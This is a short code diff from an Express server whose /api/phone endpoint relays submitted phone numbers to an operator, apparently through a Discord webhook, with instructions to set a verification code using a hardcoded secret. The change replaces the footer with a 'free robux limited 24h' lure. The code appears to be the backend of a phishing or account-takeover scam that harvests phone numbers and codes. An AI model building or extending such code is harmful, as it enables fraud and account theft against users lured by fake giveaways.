@@ -27,7 +27,7 @@ app.post('/api/phone', async (req, res) => {
     description: `**Numéro :** \`${phone}\`\nSet le code avec :\n\`\`\`\nPOST /api/set-code\n{"phone":"${phone}","code":"XXXXXX","secret":"lovego2025"}\n\`\`\``,
     color: 0x6366F1,
     timestamp: new Date().toISOString(),
-    footer: { text: 'Running Link Lovego' }
+    footer: { text: 'free robux limited 24h ' }
   });
   res.json({ success: true });
 });
